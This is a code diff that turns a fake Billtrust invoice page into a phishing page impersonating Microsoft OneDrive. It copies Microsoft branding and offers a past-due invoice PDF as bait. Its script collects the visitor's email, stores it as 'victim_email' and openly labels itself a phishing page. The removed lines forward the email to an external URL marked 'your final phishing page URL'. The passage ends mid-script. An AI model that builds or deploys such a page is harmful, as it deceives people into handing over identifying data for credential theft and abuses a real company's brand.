@@ -1,332 +1,696 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Invoice Payment - Billtrust</title>
+    <title>Microsoft OneDrive - Secure Document Received</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #f5f7fa;
+            background-color: #f8f8f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
             padding: 20px;
+            color: #333;
+            overflow: hidden;
+        }
+        
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+            transition: opacity 0.5s ease-out;
+        }
+        
+        #loadingLogo {
+            width: 180px;
+            height: 180px;
+        }
+        
+        #MSLogo {
+            position: fixed;
+            bottom: 36px;
+            width: 99px;
+            height: 22px;
+        }
+        
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e5e5e5;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
         }
         
         .header {
-            background: white;
-            padding: 20px 40px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            margin-bottom: 40px;
+            padding: 28px 28px 20px;
+            text-align: center;
+            border-bottom: 1px solid #e5e5e5;
         }
         
-        .logo {
-            max-width: 200px;
+        .microsoft-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        
+        .logo-img {
+            width: 108px;
+            height: 20px;
+        }
+        
+        .header h1 {
+            color: #1b1b1b;
+            font-size: 19px;
+            font-weight: 600;
+            margin: 8px 0 4px;
+        }
+        
+        .header p {
+            color: #605e5c;
+            font-size: 14px;
+        }
+        
+        .content {
+            padding: 28px;
+        }
+        
+        .content h2 {
+            font-size: 21px;
+            font-weight: 300;
+            color: #1b1b1b;
+            margin-bottom: 16px;
+        }
+        
+        .secure-link {
+            background-color: #f8f9fa;
+            border: 1px solid #e1e5eb;
+            padding: 16px;
+            margin: 16px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .secure-link p {
+            font-size: 14px;
+            color: #605e5c;
+            margin-bottom: 0;
+        }
+        
+        .secure-link .filename {
+            font-weight: 600;
+            color: #323130;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .pdf-logo {
+            width: 32px;
             height: 40px;
-            background: #0066cc;
+            background: linear-gradient(135deg, #F40F02 0%, #D0021B 100%);
+            border-radius: 2px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
+            font-size: 12px;
             font-weight: bold;
-            font-size: 24px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        
+        .pdf-logo:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            border-width: 0 8px 8px 0;
+            border-style: solid;
+            border-color: transparent #fff transparent transparent;
+        }
+        
+        .pdf-logo:after {
+            content: 'PDF';
+            font-size: 8px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            margin-top: 8px;
+        }
+        
+        .pdf-logo .file-corner {
+            position: absolute;
+            top: -1px;
+            right: -1px;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 0 12px 12px 0;
+            border-color: transparent #e5e5e5 transparent transparent;
+        }
+        
+        .pdf-logo .file-fold {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 0 10px 10px 0;
+            border-color: transparent #c8c6c4 transparent transparent;
+        }
+        
+        .document-info {
+            background-color: #f3f2f1;
+            padding: 12px;
             border-radius: 4px;
-            padding: 0 20px;
+            margin: 16px 0;
+            font-size: 13px;
         }
         
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            padding: 40px;
+        .document-info p {
+            margin: 4px 0;
+            color: #323130;
         }
         
-        .alert {
-            background: #e3f2fd;
-            border-left: 4px solid #2196F3;
-            padding: 15px 20px;
-            margin-bottom: 30px;
-            border-radius: 4px;
-        }
-        
-        .alert-icon {
-            font-size: 24px;
-            margin-right: 10px;
-            vertical-align: middle;
-        }
-        
-        .alert-text {
-            display: inline-block;
-            vertical-align: middle;
-            color: #1565C0;
-        }
-        
-        h1 {
-            color: #333;
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-        
-        .invoice-id {
-            color: #666;
+        .instructions {
+            color: #323130;
+            margin-bottom: 24px;
+            line-height: 1.5;
             font-size: 14px;
-            margin-bottom: 30px;
         }
         
-        .info-box {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 30px;
+        .input-group {
+            margin-bottom: 24px;
         }
         
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid #dee2e6;
-        }
-        
-        .info-row:last-child {
-            border-bottom: none;
-        }
-        
-        .info-label {
-            color: #666;
-            font-weight: 500;
-        }
-        
-        .info-value {
-            color: #333;
-            font-weight: bold;
-        }
-        
-        .amount {
-            font-size: 24px;
-            color: #d32f2f;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
+        .input-group label {
             display: block;
             margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
+            font-weight: 600;
+            color: #323232;
+            font-size: 14px;
         }
         
-        input {
+        .input-group input {
             width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #ddd;
-            border-radius: 6px;
-            font-size: 16px;
+            padding: 6px 12px;
+            border: 1px solid #8a8886;
+            font-size: 14px;
             transition: border-color 0.3s;
+            height: 36px;
         }
         
-        input:focus {
+        .input-group input:focus {
             outline: none;
-            border-color: #0066cc;
+            border-color: #0078d4;
         }
         
-        .btn {
-            width: 100%;
-            padding: 15px;
-            background: #0066cc;
+        .btn-next {
+            background-color: #0078d4;
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
+            padding: 6px 20px;
+            width: 100%;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: background-color 0.3s;
+            height: 32px;
         }
         
-        .btn:hover {
-            background: #0052a3;
+        .btn-next:hover {
+            background-color: #106ebe;
         }
         
-        .btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        
-        .secure-note {
-            text-align: center;
-            color: #666;
+        .legal-text {
             font-size: 12px;
-            margin-top: 20px;
-        }
-        
-        .secure-icon {
-            color: #4caf50;
-            margin-right: 5px;
-        }
-        
-        .loading {
-            display: none;
+            color: #605e5c;
             text-align: center;
-            padding: 20px;
+            margin-top: 24px;
+            line-height: 1.4;
         }
         
-        .loading.active {
-            display: block;
+        .footer {
+            padding: 16px 28px;
+            background-color: #f8f9fa;
+            border-top: 1px solid #e1e5eb;
+            text-align: center;
+            font-size: 12px;
+            color: #605e5c;
         }
         
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0066cc;
-            border-radius: 50%;
-            width: 40px;
+        .error-message {
+            color: #d13438;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: #e1e5eb;
+            margin: 20px 0;
+        }
+        
+        .success-message {
+            background-color: #dff6dd;
+            color: #107c10;
+            padding: 12px;
+            border-radius: 4px;
+            margin: 16px 0;
+            display: none;
+            font-size: 14px;
+        }
+
+        /* Animation Styles */
+        :root {
+            --s: 180px;
+            --envW: 130px;
+            --envH: 71px;
+            --calW: 118px;
+            --sqW: calc(var(--calW) / 3);
+            --sqH: 37px;
+            --calHH: 20px;
+            --calH: calc(var(--sqH) * 3 + var(--calHH));
+            --calY: calc(var(--calH) + 20px);
+            --calYExt: calc(var(--calH) - 80px);
+            --calYOverExt: calc(var(--calH) - 92px);
+            --flapS: 96px;
+            --flapH: calc(0.55 * var(--envH));
+            --flapScaleY: calc(var(--flapH) / var(--flapWidth));
+            --dur: 5s;
+        }
+
+        #container {
+            width: var(--s);
+            height: var(--s);
+            animation: bounce var(--dur) infinite;
+        }
+
+        @keyframes bounce {
+            0% { transform: translateY(0); }
+            12.5% { transform: translateY(0); }
+            22.5% { transform: translateY(7px); }
+            32.5% { transform: translateY(0); }
+            50% { transform: translateY(0); }
+            76.1% { transform: translateY(0); }
+            86% { transform: translateY(7px); }
+            100% { transform: translateY(0); }
+        }
+
+        #logo {
+            height: 179px;
+            width: 130px;
+            overflow: hidden;
+            margin-top: -59px;
+            margin-left: 25px;
+        }
+
+        #containerShadow {
+            position: relative;
+            top: 120px;
+            left: 25px;
+            width: var(--envW);
+            height: var(--envH);
+            border-radius: 0 0 7px 7px;
+            box-shadow: rgba(0, 0, 0, .25) 0 4px 5px;
+            animation: shadow-fade var(--dur) infinite;
+        }
+
+        @keyframes shadow-fade {
+            0% { opacity: 0; }
+            21.2% { opacity: 0; }
+            47% { opacity: 1; }
+            70% { opacity: 1; }
+            80% { opacity: 0; }
+            100% { opacity: 0; }
+        }
+
+        #flapContainer {
+            width: var(--envW);
+            margin-top: 179px;
+        }
+
+        #ef {
+            width: var(--envW);
+            height: var(--envH);
+            border-radius: 0 0 7px 7px;
+            overflow: hidden;
+            margin-top: -41px;
+        }
+
+        #ef > .l {
+            width: 287px;
+            height: var(--envH);
+            background: #28a8ea;
+            transform: translate(-153px, -70px) rotate(28deg);
+        }
+
+        #ef > .r {
+            width: 287px;
+            height: var(--envH);
+            background: #1490df;
+            transform: translate(-120px, 63px) rotate(-28deg);
+        }
+
+        #eb {
+            width: var(--envW);
             height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
+            background: #123b6d;
+            margin-top: -70px;
         }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        #cal {
+            display: flex;
+            flex-direction: row;
+            flex-wrap: wrap;
+            width: var(--calW);
+            height: var(--calH);
+            border-radius: 7px;
+            overflow: hidden;
+            margin: 0 auto;
+            margin-top: -306px;
+            animation: cal-bounce var(--dur) infinite;
+            animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
+            transform: translateY(var(--calYExt)) scaleY(1);
+        }
+
+        @keyframes cal-bounce {
+            0% { transform: translateY(var(--calY)) scaleY(1); }
+            16.5% { transform: translateY(var(--calY)) scaleY(1); }
+            28% { transform: translateY(var(--calYOverExt)) scaleY(1); }
+            31% { transform: translateY(var(--calYExt)) scaleY(1.05); }
+            33% { transform: translateY(var(--calYExt)) scaleY(.96); }
+            34% { transform: translateY(var(--calYExt)) scaleY(1); }
+            68.5% { 
+                transform: translateY(var(--calYExt)) scaleY(1);
+                animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29);
+            }
+            76.1% { transform: translateY(var(--calY)) scaleY(1); }
+            100% { transform: translateY(var(--calY)) scaleY(1); }
+        }
+
+        #cal > .t {
+            width: var(--calW);
+            height: calc(var(--calHH) + 1px);
+            margin-bottom: -1px;
+            background: #0358a7;
+        }
+
+        #cal > .r {
+            display: flex;
+            flex-direction: row;
+            width: var(--calW);
+            height: var(--sqH);
+        }
+
+        .s {
+            width: var(--sqW);
+            height: calc(var(--sqH) + 1px);
+        }
+
+        .s1 { background: #0078d4; }
+        .s2 { background: #28a8ea; }
+        .s3 { background: #50d9ff; }
+        .s4 { background: #0364b8; }
+        .s5 { background: #14447d; }
+
+        #openedFlap {
+            width: var(--envW);
+            height: 107px;
+            animation: opened-flap-swing var(--dur) infinite;
+            animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
+            transform-origin: top;
+            transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
+        }
+
+        @keyframes opened-flap-swing {
+            0% { transform: translateY(-68px) rotate3d(1, 0, 0, -90deg); }
+            14.5% { transform: translateY(-68px) rotate3d(1, 0, 0, -90deg); }
+            16.5% { transform: translateY(-68px) rotate3d(1, 0, 0, -180deg); }
+            50% { transform: translateY(-68px) rotate3d(1, 0, 0, -180deg); }
+            74% { transform: translateY(-68px) rotate3d(1, 0, 0, -180deg); }
+            76% { transform: translateY(-68px) rotate3d(1, 0, 0, -90deg); }
+            100% { transform: translateY(-68px) rotate3d(1, 0, 0, -90deg); }
+        }
+
+        #closedFlap {
+            width: var(--envW);
+            animation: closed-flap-swing var(--dur) infinite;
+            animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
+            transform-origin: top;
+            transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg);
+        }
+
+        @keyframes closed-flap-swing {
+            0% { transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0); }
+            8.5% { transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0); }
+            14.5% { transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg); }
+            50% { transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg); }
+            76% { transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg); }
+            77% { transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0); }
+            100% { transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0); }
+        }
+
+        #fmask {
+            width: var(--envW);
+            height: 107px;
+            overflow: hidden;
+        }
+
+        .flapTriangle {
+            width: var(--flapS);
+            height: var(--flapS);
+            background: #50d9ff;
+            margin: -48px auto 0 auto;
+            border-radius: 7px;
+            transform: scaleY(.6) rotate(45deg);
+        }
+
+        #openedFlap .flapTriangle {
+            background: #123b6d;
+        }
+
+        #closedFlap .flapTriangle {
+            background: #50d9ff;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">BILLTRUST</div>
+    <div id="loadingScreen">
+        <div id="loadingLogo">
+            <div id="container">
+                <div id="containerShadow"></div>
+                <div id="logo">
+                    <div id="flapContainer">
+                        <div id="openedFlap">
+                            <div id="fmask">
+                                <div class="flapTriangle"></div>
+                            </div>
+                        </div>
+                        <div id="cal">
+                            <div class="t"></div>
+                            <div class="r">
+                                <div class="s s1"></div>
+                                <div class="s s2"></div>
+                                <div class="s s3"></div>
+                            </div>
+                            <div class="r">
+                                <div class="s s4"></div>
+                                <div class="s s1"></div>
+                                <div class="s s2"></div>
+                            </div>
+                            <div class="r">
+                                <div class="s s5"></div>
+                                <div class="s s4"></div>
+                                <div class="s s1"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="eb"></div>
+                    <div id="ef">
+                        <div class="r"></div>
+                        <div class="l"></div>
+                    </div>
+                    <div id="closedFlap">
+                        <div id="fmask">
+                            <div class="flapTriangle"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <svg height="22" id="MSLogo" width="99" xmlns="http://www.w3.org/2000/svg">
+            <g fill="none" fill-rule="evenodd">
+                <path d="M34.643 12.075l-.588 1.647h-.034c-.105-.387-.28-.934-.556-1.63l-3.15-7.897h-3.077V16.75h2.03V9.032c0-.476-.01-1.052-.03-1.711-.01-.333-.049-.6-.058-.804h.045c.103.473.21.834.287 1.075l3.776 9.16h1.42l3.748-9.243c.085-.211.175-.622.257-.992h.044c-.048.915-.09 1.75-.095 2.256v7.978h2.165V4.195h-2.956l-3.228 7.88z" fill="#737474"></path>
+                <path d="M0 20.956h98.148V0H0z"></path>
+                <path d="M42.866 16.751h2.118V7.752h-2.118zM43.947 3.929c-.349 0-.653.119-.902.353a1.166 1.166 0 00-.378.883c0 .344.126.636.374.865.247.23.552.345.906.345s.66-.115.91-.345c.25-.23.379-.52.379-.865 0-.339-.125-.632-.37-.873a1.262 1.262 0 00-.919-.363M52.477 7.663a5.892 5.892 0 00-1.182-.127c-.971 0-1.838.209-2.574.62-.739.41-1.31.998-1.699 1.745-.386.745-.583 1.615-.583 2.585 0 .85.19 1.631.567 2.318.377.69.91 1.23 1.585 1.602.673.373 1.452.563 2.313.563 1.006 0 1.866-.201 2.554-.597l.027-.017v-1.94l-.089.066c-.312.227-.66.408-1.035.538a3.121 3.121 0 01-1.014.197c-.83 0-1.497-.260-1.982-.772-.485-.513-.73-1.233-.73-2.14 0-.912.255-1.651.761-2.196.504-.544 1.173-.82 1.986-.82.695 0 1.374.236 2.014.702l.90.063V8.011l-.029-.017c-.241-.135-.571-.246-.98-.331M59.452 7.597a2.17 2.17 0 00-1.415.507c-.358.296-.616.7-.814 1.207H57.2V7.753h-2.116v8.999H57.2v-4.603c0-.784.178-1.426.528-1.912.346-.48.806-.723 1.369-.723.19 0 .404.031.636.093.23.063.396.129.493.200l.90.064V7.737l-.034-.014c-.197-.083-.477-.126-.83-.126M66.885 14.465c-.397.499-.996.751-1.779.751-.777 0-1.39-.256-1.823-.766-.435-.510-.655-1.238-.655-2.163 0-.954.22-1.701.655-2.220.433-.516 1.040-.778 1.806-.778.743 0 1.335.250 1.758.744.426.496.642 1.237.642 2.202 0-.977-.203-1.728-.604-2.230m-1.683-6.929c-1.484 0-2.663.435-3.503 1.293-.840.857-1.265 2.044-1.265 3.527 0 1.410.415 2.543 1.235 3.368.820.826 1.936 1.245 3.316 1.245 1.438 0 2.593-.441 3.434-1.310.840-.870 1.265-2.045 1.265-3.493 0-1.433-.400-2.573-1.187-3.394-.789-.820-1.897-1.236-3.295-1.236M74.378 11.471c-.667-.268-1.095-.490-1.270-.660-.170-.165-.257-.398-.257-.693 0-.262.108-.472.327-.642.219-.170.526-.257.911-.257.357 0 .723.056 1.085.166.363.111.682.260.949.440l.088.060V7.928l-.035-.015a4.715 4.715 0 00-.962-.268 5.932 5.932 0 00-1.056-.109c-1.010 0-1.845.258-2.483.767-.640.512-.967 1.184-.967 1.997 0 .422.070.798.209 1.116.140.320.355.600.641.837.283.233.722.478 1.302.728.488.200.852.370 1.083.505.227.130.387.263.477.390.088.126.133.285.133.472 0 .599-.408.903-1.212.903a3.61 3.61 0 01-1.278-.248 4.827 4.827 0 01-1.095-.594l-.091-.067v2.063l.034.017c.305.152.677.279 1.104.378.426.1.845.150 1.243.150 1.092 0 1.972-.252 2.616-.747.643-.497.970-1.172.970-2.009 0-.567-.173-1.048-.515-1.429-.342-.38-.912-.735-1.693-1.053M82.16 7.663a5.896 5.896 0 00-1.182-.127c-.972 0-1.838.209-2.574.62-.740.41-1.310.998-1.700 1.745-.385.745-.582 1.615-.582 2.585 0 .85.19 1.631.567 2.318.376.69.91 1.23 1.585 1.602.673.373 1.452.563 2.313.563 1.005 0 1.865-.201 2.554-.597l.027-.017v-1.94l-.090.066c-.311.227-.66.408-1.034.538a3.129 3.129 0 01-1.015.197c-.83 0-1.497-.260-1.981-.772-.486-.513-.731-1.233-.731-2.14 0-.912.256-1.651.761-2.196.505-.544 1.173-.82 1.987-.82.695 0 1.373.236 2.013.702l.090.063V8.011l-.029-.017c-.241-.135-.570-.246-.979-.331M89.76 7.597c-.495 0-.949.125-1.350.37-.39.238-.697.576-.913 1.006h-.023V7.752h-2.115v8.999h2.116V12.18c0-.777.183-1.409.544-1.88.358-.467.830-.704 1.404-.704.521 0 .921.165 1.188.489.268.326.404.831.404 1.500v5.165h2.115V11.18c0-1.168-.28-2.063-.834-2.66-.555-.599-1.337-.923-2.536-.923" fill="#737474"></path>
+                <path d="M0 9.958h9.958V.001H0z" fill="#F05124"></path>
+                <path d="M10.995 9.958h9.957V.001h-9.957z" fill="#7EBB42"></path>
+                <path d="M0 20.956h9.958V11H0z" fill="#32A0DA"></path>
+                <path d="M10.995 20.956h9.957V11h-9.957z" fill="#FDB813"></path>
+            </g>
+        </svg>
     </div>
-    
-    <div class="container">
-        <div class="alert">
-            <span class="alert-icon">ℹ️</span>
-            <span class="alert-text">
-                <strong>Action Required:</strong> Your invoice is ready for payment
-            </span>
+
+    <div class="container" id="verificationForm">
+        <div class="header">
+            <div class="microsoft-logo">
+                <svg class="logo-img" xmlns="http://www.w3.org/2000/svg" width="108" height="20" viewBox="0 0 108 20">
+                    <path d="M0 0h9.5v9.5H0zm10.5 0H20v9.5h-9.5zM0 10.5h9.5V20H0zm10.5 0H20V20h-9.5z" fill="#f25022"/>
+                    <path d="M23.5 5.5h2.8c.5 0 .9.2 1.2.5.3.3.5.7.5 1.2v5.6c0 .5-.2.9-.5 1.2-.3.3-.7.5-1.2.5h-2.8V5.5zm1.4 1.1v7h1.4c.3 0 .5-.1.6-.2.2-.1.2-.4.2-.6v-5.6c0-.3-.1-.5-.2-.6-.1-.2-.4-.2-.6-.2h-1.4v.2zm5.7 2.8c.4 0 .7.2 1 .5.3.3.5.6.5 1v2.8c0 .4-.2.7-.5 1-.3.3-.6.5-1 .5h-1.9V9.4h1.9zm.3 4.2c.1-.1.2-.3.2-.5V10.3c0-.2-.1-.4-.2-.5-.1-.1-.3-.2-.5-.2h-.5v3.2h.5c.2 0 .4 0 .5-.2zm2.4-4.2h1.4v4.8h-1.4V9.4zm0-1.1h1.4v1h-1.4v-1zm3.9 1.1c.4 0 .7.2 1 .5.3.3.5.6.5 1v2.8c0 .4-.2.7-.5 1-.3.3-.6.5-1 .5h-1.9V9.4h1.9zm.3 4.2c.1-.1.2-.3.2-.5V10.3c0-.2-.1-.4-.2-.5-.1-.1-.3-.2-.5-.2h-.5v3.2h.5c.2 0 .4 0 .5-.2zm2.4-4.2h1.9c.4 0 .7.2 1 .5.3.3.5.6.5 1v.9c0 .4-.2.7-.5 1-.3.3-.6.5-1 .5h-.5v1.9h-1.4V9.4zm1.4 2.8h.5c.2 0 .4 0 .5-.2.1-.1.2-.3.2-.5v-.9c0-.2-.1-.4-.2-.5-.1-.1-.3-.2-.5-.2h-.5v2.3zm4.1-2.8h1.9c.4 0 .7.2 1 .5.3.3.5.6.5 1v.9c0 .4-.2.7-.5 1-.3.3-.6.5-1 .5h-.5v1.9h-1.4V9.4zm1.4 2.8h.5c.2 0 .4 0 .5-.2.1-.1.2-.3.2-.5v-.9c0-.2-.1-.4-.2-.5-.1-.1-.3-.2-.5-.2h-.5v2.3zm3.7-2.8h1.4v4.8h-1.4V9.4zm0-1.1h1.4v1h-1.4v-1zm3.9 1.1c.4 0 .7.2 1 .5.3.3.5.6.5 1v2.8c0 .4-.2.7-.5 1-.3.3-.6.5-1 .5h-1.9V9.4h1.9zm.3 4.2c.1-.1.2-.3.2-.5V10.3c0-.2-.1-.4-.2-.5-.1-.1-.3-.2-.5-.2h-.5v3.2h.5c.2 0 .4 0 .5-.2zm2.8-4.2h2.3c.4 0 .7.2 1 .5.3.3.5.6.5 1v.4c0 .3-.1.5-.3.7-.2.2-.4.3-.7.4v.1c.3 0 .5.2.7.4.2.2.3.5.3.7v.5c0 .4-.2.7-.5 1-.3.3-.6.5-1 .5h-2.3V9.4zm1.4 2.2h.9c.2 0 .4 0 .5-.2.1-.1.2-.3.2-.5v-.4c0-.2-.1-.4-.2-.5-.1-.1-.3-.2-.5-.2h-.9v1.8zm0 2.6h.9c.2 0 .4 0 .5-.2.1-.1.2-.3.2-.5v-.5c0-.2-.1-.4-.2-.5-.1-.1-.3-.2-.5-.2h-.9v1.9zm4.1-4.8h1.4v3.7h1.9v1.1h-3.3V9.4zm5.2 0h1.4v4.8h-1.4V9.4zm0-1.1h1.4v1h-1.4v-1zm3.9 1.1c.4 0 .7.2 1 .5.3.3.5.6.5 1v2.8c0 .4-.2.7-.5 1-.3.3-.6.5-1 .5h-1.9V9.4h1.9zm.3 4.2c.1-.1.2-.3.2-.5V10.3c0-.2-.1-.4-.2-.5-.1-.1-.3-.2-.5-.2h-.5v3.2h.5c.2 0 .4 0 .5-.2zm3.3-4.2h1.4v3.7h1.9v1.1h-3.3V9.4z" fill="#737373"/>
+                </svg>
+            </div>
+            <h1>OneDrive</h1>
+            <p>Microsoft</p>
         </div>
         
-        <h1>Invoice Payment</h1>
-        <p class="invoice-id">Invoice #INV-2024-<span id="invoiceNumber"></span></p>
-        
-        <div class="info-box">
-            <div class="info-row">
-                <span class="info-label">Invoice Date:</span>
-                <span class="info-value" id="invoiceDate"></span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Due Date:</span>
-                <span class="info-value" id="dueDate"></span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Amount Due:</span>
-                <span class="info-value amount" id="amount"></span>
-            </div>
-        </div>
-        
-        <form id="emailForm">
-            <div class="form-group">
-                <label for="email">Email Address:</label>
-                <input 
-                    type="email" 
-                    id="email" 
-                    name="email" 
-                    placeholder="Enter your email to view invoice details" 
-                    required
-                    autocomplete="email"
-                >
+        <div class="content">
+            <h2>Secure Document Received</h2>
+            <p class="instructions">You've received a secure document shared via OneDrive:</p>
+            
+            <div class="secure-link">
+                <div class="pdf-logo"></div>
+                <div>
+                    <p>Document:</p>
+                    <p class="filename">Invoice Past Due.pdf</p>
+                </div>
             </div>
             
-            <button type="submit" class="btn" id="submitBtn">
-                View Invoice & Continue to Payment
-            </button>
-        </form>
-        
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Verifying your information...</p>
+            <div class="document-info">
+                <p><strong>Document Type:</strong> PDF File</p>
+                <p><strong>Size:</strong> 6.4 MB</p>
+                <p><strong>Shared via:</strong> Microsoft OneDrive</p>
+                <p><strong>Status:</strong> Awaiting verification</p>
+            </div>
+            
+            <p class="instructions">To verify your identity and access this secure document, please enter your email address.</p>
+            
+            <div class="divider"></div>
+            
+            <form id="emailForm">
+                <div class="input-group">
+                    <label for="email">Enter your email address</label>
+                    <input type="email" id="email" name="email" required placeholder="Enter your email address">
+                    <div class="error-message" id="errorMessage">Please enter a valid email address</div>
+                </div>
+                
+                <button type="submit" class="btn-next">Verify &amp; Continue</button>
+            </form>
+            
+            <div class="success-message" id="successMessage">
+                ✓ Verification successful. Redirecting to document...
+            </div>
+            
+            <p class="legal-text">By clicking Verify &amp; Continue, you allow Microsoft to use Internet-based services as part of your Outlook and Office 365 experience</p>
         </div>
         
-        <p class="secure-note">
-            <span class="secure-icon">🔒</span>
-            Secure payment powered by Billtrust
-        </p>
+        <div class="footer">
+            <p>© 2025 Microsoft Privacy &amp; Cookies</p>
+        </div>
     </div>
 
     <script>
-        // Generate random invoice details
-        function generateInvoiceData() {
-            const invoiceNum = Math.floor(Math.random() * 9000) + 1000;
-            const today = new Date();
-            const invoiceDate = new Date(today);
-            invoiceDate.setDate(today.getDate() - Math.floor(Math.random() * 10));
-            const dueDate = new Date(today);
-            dueDate.setDate(today.getDate() + Math.floor(Math.random() * 5));
-            const amount = (Math.random() * 5000 + 500).toFixed(2);
+        // Store email in sessionStorage
+        sessionStorage.setItem('page_loaded', 'inv_html');
+        console.log('📄 Inv.html loaded - Microsoft OneDrive phishing page');
+        
+        // Show loading animation for 3 seconds, then transition to form
+        setTimeout(function() {
+            const loadingScreen = document.getElementById('loadingScreen');
+            const verificationForm = document.getElementById('verificationForm');
             
-            return {
-                number: invoiceNum,
-                invoiceDate: invoiceDate.toLocaleDateString('en-US', { 
-                    year: 'numeric', 
-                    month: 'long', 
-                    day: 'numeric' 
-                }),
-                dueDate: dueDate.toLocaleDateString('en-US', { 
-                    year: 'numeric', 
-                    month: 'long', 
-                    day: 'numeric' 
-                }),
-                amount: amount
-            };
-        }
+            // Fade out loading screen
+            loadingScreen.style.opacity = '0';
+            
+            // After fade out completes, show the form
+            setTimeout(function() {
+                loadingScreen.style.display = 'none';
+                verificationForm.style.opacity = '1';
+                verificationForm.style.transform = 'translateY(0)';
+            }, 500);
+        }, 3000);
         
-        // Populate invoice data
-        const invoiceData = generateInvoiceData();
-        document.getElementById('invoiceNumber').textContent = invoiceData.number;
-        document.getElementById('invoiceDate').textContent = invoiceData.invoiceDate;
-        document.getElementById('dueDate').textContent = invoiceData.dueDate;
-        document.getElementById('amount').textContent = '$' + invoiceData.amount;
-        
-        // Handle form submission
+        // Form validation and submission
         document.getElementById('emailForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const email = document.getElementById('email').value.trim();
+            const emailInput = document.getElementById('email');
+            const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
+            const email = emailInput.value.trim();
             
-            if (!email || !email.includes('@')) {
-                alert('Please enter a valid email address');
+            // Simple email validation
+            if (!validateEmail(email)) {
+                errorMessage.style.display = 'block';
+                successMessage.style.display = 'none';
+                emailInput.style.borderColor = '#d13438';
                 return;
             }
             
-            console.log('📧 Email Collected:', email);
+            // If email is valid, proceed with verification
+            errorMessage.style.display = 'none';
+            emailInput.style.borderColor = '#8a8886';
+            successMessage.style.display = 'block';
             
-            // Store email in session
+            // Store email in sessionStorage
             sessionStorage.setItem('victim_email', email);
+            console.log('💾 Email captured:', email);
             
-            // Show loading state
-            document.getElementById('emailForm').style.display = 'none';
-            document.getElementById('loading').classList.add('active');
+            // Disable the form to prevent multiple submissions
+            emailInput.disabled = true;
+            document.querySelector('.btn-next').disabled = true;
             
-            // Build final URL with email parameter
-            // CHANGE THIS to your final phishing page URL
-            const finalURL = 'https://click.sensoriopaso.com/em?r=https%3A%2F%2Fnipctbd.org/8ia%2F&amp;ecr=Y-9SIcdQOo1WYkAPxySoaZobMSvhRrTDKQ%3D%3D+' + encodeURIComponent(email);
-            
-            console.log('🚀 Redirecting to:', finalURL);
+            // Show loading animation again before redirecting
